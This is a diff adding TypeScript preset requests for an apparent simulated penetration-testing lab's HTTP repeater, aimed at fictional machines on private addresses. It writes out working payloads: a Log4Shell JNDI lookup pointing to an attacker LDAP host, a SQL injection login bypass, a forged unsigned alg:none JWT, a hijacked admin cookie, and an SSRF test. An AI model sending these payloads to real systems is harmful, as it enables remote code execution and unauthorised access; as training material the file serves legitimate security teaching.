@@ -1,0 +1,157 @@
+import { HttpPreset } from '../../types/httpRepeater';
+
+export const REPEATER_PRESETS: HttpPreset[] = [
+  {
+    id: 'preset-log4j',
+    name: '1. E-Corp HR: Log4Shell JNDI Exploit',
+    category: 'EXPLOIT',
+    targetMachineId: 'ecorp-hr',
+    method: 'POST',
+    url: 'http://10.10.11.45:80/api/audit',
+    headers: [
+      { id: 'h1', key: 'Host', value: '10.10.11.45', enabled: true },
+      { id: 'h2', key: 'User-Agent', value: '${jndi:ldap://10.10.14.22:1389/Exploit}', enabled: true },
+      { id: 'h3', key: 'Content-Type', value: 'application/json', enabled: true },
+      { id: 'h4', key: 'X-Forwarded-For', value: '10.10.14.22', enabled: true },
+    ],
+    cookies: [],
+    bodyType: 'json',
+    body: JSON.stringify(
+      {
+        event: 'login_attempt',
+        audit_payload: '${jndi:ldap://10.10.14.22:1389/Exploit}',
+      },
+      null,
+      2
+    ),
+    description: 'Triggers Apache Log4j JNDI remote code execution against the audit logging service.',
+  },
+  {
+    id: 'preset-sqli',
+    name: '2. IronBank: SQL Injection Auth Bypass',
+    category: 'AUTH_BYPASS',
+    targetMachineId: 'iron-vault',
+    method: 'POST',
+    url: 'http://10.10.11.82:3000/api/login',
+    headers: [
+      { id: 'h1', key: 'Host', value: '10.10.11.82:3000', enabled: true },
+      { id: 'h2', key: 'Content-Type', value: 'application/json', enabled: true },
+    ],
+    cookies: [],
+    bodyType: 'json',
+    body: JSON.stringify(
+      {
+        username: "admin' OR 1=1 -- -",
+        password: 'none',
+      },
+      null,
+      2
+    ),
+    description: 'Bypasses MySQL login check and captures user flag and JWT token.',
+  },
+  {
+    id: 'preset-jwt-none',
+    name: '3. IronBank: JWT alg:none Vault Access',
+    category: 'AUTH_BYPASS',
+    targetMachineId: 'iron-vault',
+    method: 'GET',
+    url: 'http://10.10.11.82:3000/api/vault',
+    headers: [
+      { id: 'h1', key: 'Host', value: '10.10.11.82:3000', enabled: true },
+      {
+        id: 'h2',
+        key: 'Authorization',
+        value: 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.',
+        enabled: true,
+      },
+    ],
+    cookies: [
+      {
+        id: 'c1',
+        name: 'auth_token',
+        value: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.',
+        path: '/',
+        enabled: true,
+      },
+    ],
+    bodyType: 'raw',
+    body: '',
+    description: 'Exploits unsigned JWT token with alg: none to access confidential financial ledgers.',
+  },
+  {
+    id: 'preset-cookie-admin',
+    name: '4. E-Corp HR: Admin Session Cookie Hijacking',
+    category: 'AUTH_BYPASS',
+    targetMachineId: 'ecorp-hr',
+    method: 'GET',
+    url: 'http://10.10.11.45:80/admin',
+    headers: [
+      { id: 'h1', key: 'Host', value: '10.10.11.45', enabled: true },
+      { id: 'h2', key: 'Cookie', value: 'session_id=admin_session_root_99', enabled: true },
+    ],
+    cookies: [
+      {
+        id: 'c1',
+        name: 'session_id',
+        value: 'admin_session_root_99',
+        path: '/',
+        enabled: true,
+      },
+    ],
+    bodyType: 'raw',
+    body: '',
+    description: 'Supplies a valid administrator session cookie to reveal protected sudo privileges and payroll memo.',
+  },
+  {
+    id: 'preset-users-api',
+    name: '5. IronBank: Users API (Query Parameter Filter)',
+    category: 'RECON',
+    targetMachineId: 'iron-vault',
+    method: 'GET',
+    url: 'http://10.10.11.82:3000/api/users?role=finance_admin',
+    headers: [
+      { id: 'h1', key: 'Host', value: '10.10.11.82:3000', enabled: true },
+      {
+        id: 'h2',
+        key: 'Authorization',
+        value: 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.',
+        enabled: true,
+      },
+    ],
+    cookies: [],
+    bodyType: 'raw',
+    body: '',
+    description: 'Filters user accounts by role query parameter on the internal banking API.',
+  },
+  {
+    id: 'preset-adcs-recon',
+    name: '6. Corp-DC01: ADCS Certificate Enrollment',
+    category: 'RECON',
+    targetMachineId: 'corp-dc01',
+    method: 'GET',
+    url: 'http://10.10.11.99:80/certsrv',
+    headers: [
+      { id: 'h1', key: 'Host', value: '10.10.11.99', enabled: true },
+      { id: 'h2', key: 'User-Agent', value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', enabled: true },
+    ],
+    cookies: [],
+    bodyType: 'raw',
+    body: '',
+    description: 'Audits Active Directory Certificate Services web enrollment interface for domain CA discovery.',
+  },
+  {
+    id: 'preset-ssrf-boundary',
+    name: '7. Security Boundary Violation (Blocked External/SSRF)',
+    category: 'SECURITY_TEST',
+    targetMachineId: 'ecorp-hr',
+    method: 'GET',
+    url: 'http://google.com/api/v1/metadata',
+    headers: [
+      { id: 'h1', key: 'Host', value: 'google.com', enabled: true },
+    ],
+    cookies: [],
+    bodyType: 'raw',
+    body: '',
+    description: 'Tests security isolation: external non-range network addresses are safely blocked.',
+  },
+];
